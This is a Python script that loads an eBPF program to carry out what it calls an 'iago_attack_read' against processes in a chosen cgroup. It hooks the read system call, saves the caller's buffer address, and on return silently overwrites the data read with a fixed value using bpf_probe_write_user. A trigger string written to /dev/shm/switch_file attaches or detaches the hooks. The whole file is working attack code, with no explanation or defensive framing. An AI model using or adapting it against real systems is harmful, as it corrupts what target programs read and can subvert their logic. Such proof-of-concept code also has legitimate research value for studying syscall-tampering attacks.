import os
import sys
import time
from bcc import BPF

if len(sys.argv) != 2:
    print("Usage: python3 script.py <target_cgroup_id>")
    sys.exit(1)

target_cgroup_id = int(sys.argv[1])

# eBPF program
BPF_PROGRAM = f"""
#include <linux/fs.h>
#include <uapi/linux/ptrace.h>

struct addr {{
    void * dst;
}};

BPF_HASH(addr_poc, u32, struct addr);

static inline bool compare_cgroup_id(u64 cgroup_id) {{
    u64 current_cgroup_id = bpf_get_current_cgroup_id();
    if (cgroup_id != current_cgroup_id)
        return false;

    return true;
}}

long syscall__read(struct pt_regs *ctx,
                   unsigned int fd, char __user *buf, size_t count)
{{
    struct addr addr_t = {{}};
    int key = 0;
    u64 target_cgroup = {target_cgroup_id};
    if (!compare_cgroup_id(target_cgroup))
        return 0;
    //if (fd == 3) {{
        addr_t.dst = buf;
        addr_poc.update(&key, &addr_t);
    // }}
    bpf_trace_printk("fd = %d", fd);
    return 0;
}}

long syscall__read_ret(struct pt_regs *ctx)
{{
    int key = 0;
    struct addr *addr_t;
    int index = 11;
    int content = 0;
    u64 success = 1;
    
    u64 target_cgroup = {target_cgroup_id};
    if (!compare_cgroup_id(target_cgroup))
        return 0;

    addr_t = addr_poc.lookup(&key);
    if(!addr_t)
        return 0;
    int ret = (int)PT_REGS_RC(ctx);
    if (ret < 0)
        goto EXIT;

//    bpf_probe_read_user(&content, sizeof(content), addr_t->dst);
//    bpf_trace_printk("content = %d", content);
//    if (content == 6)
    success = bpf_probe_write_user(addr_t->dst, &index, sizeof(index));

EXIT:
    return 0;
}}
"""

bpf = BPF(text=BPF_PROGRAM)

switch_file = "/dev/shm/switch_file"

if not os.path.exists(switch_file):
    with open(switch_file, "w") as f:
        f.write("")

print("eBPF program loaded. Monitoring /dev/shm/switch_file for commands...")

try:
    attached = False 
    while True:
        with open(switch_file, "r") as f:
            content = f.read().strip()

        if content == "iago_attack_read" and not attached:
            print("Attaching kretprobe to read...")
            bpf.attach_kprobe(event=bpf.get_syscall_fnname("read"), fn_name="syscall__read")
            bpf.attach_kretprobe(event=bpf.get_syscall_fnname("read"), fn_name="syscall__read_ret")
            attached = True

        elif content != "iago_attack_read" and attached:
            print("Detaching kretprobe from read...")
            bpf.detach_kprobe(event=bpf.get_syscall_fnname("read"), fn_name="syscall__read")
            bpf.detach_kretprobe(event=bpf.get_syscall_fnname("read"), fn_name="syscall__read_ret")
            attached = False


        time.sleep(1)
except KeyboardInterrupt:
    if attached:
        bpf.detach_kprobe(event=bpf.get_syscall_fnname("read"), fn_name="syscall__read")
        bpf.detach_kretprobe(event=bpf.get_syscall_fnname("read"), fn_name="syscall__read_ret")
    print("Detaching probes and exiting...")
